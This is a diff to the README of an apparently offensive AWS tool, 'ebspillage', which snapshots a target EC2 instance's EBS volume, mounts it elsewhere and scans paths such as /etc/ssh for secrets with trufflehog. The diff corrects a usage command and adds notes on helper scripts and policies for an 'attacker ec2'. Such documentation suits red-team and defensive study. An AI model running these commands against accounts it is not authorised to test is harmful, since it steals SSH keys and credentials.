@@ -18,7 +18,7 @@ This is an EC2 EBS post-exploitation script. The end goal is to make your life a
 ### Same Account Abuse
 This scenario involves creating a snapshot and mounting the volume within the same AWS account.
 ```
-python3 ebspillage.py --src-profile $dst_profile --dst-profile $dst_profile --src-region us-east-1 --dst-region us-east-1 --mount-path /root/blah --pillage --ssh-key-path ~/.ssh/id_rsa --target-ec2 i-09639c1f8c7408b0d --mount-host i-06549773ee1b5a056 --pillage-path /etc/ssh --out-file ./trufflehog.out --json
+python3 ebspillage.py --src-profile $src_profile --dst-profile $dst_profile --src-region us-east-1 --dst-region us-east-1 --mount-path /root/blah --pillage --ssh-key-path ~/.ssh/id_rsa --target-ec2 i-09639c1f8c7408b0d --mount-host i-06549773ee1b5a056 --pillage-path /etc/ssh --out-file ./trufflehog.out --json
 ```
 
 ### Cross-Account Abuse Without Snapshot Transfer
@@ -111,10 +111,17 @@ This command will delete all EC2 instances, EBS volumes, and snapshots in the sp
   - Finds and deletes all EBS volumes and snapshots tagged with `TrufflehogTesting`.
   - Ensures that resources are cleaned up thoroughly to avoid unnecessary charges.
 
-### Requirements
+- `setup_instance_profile.sh`:
+  - Configures instance profile with the required permissions to run SSM 
 
-- **AWS CLI**: The scripts require the AWS CLI to be installed and configured with appropriate credentials.
-- **JQ**: The `jq` command-line tool is used to parse JSON output from the AWS CLI.
+- `ssm_policy.json` and `ssm_trust_policy.json`
+  - Example policies that can be used for testing or your attacker ec2
+
+
+### Helper Requirements
+
+- AWS cli
+- jq
 
 ## To Do
 
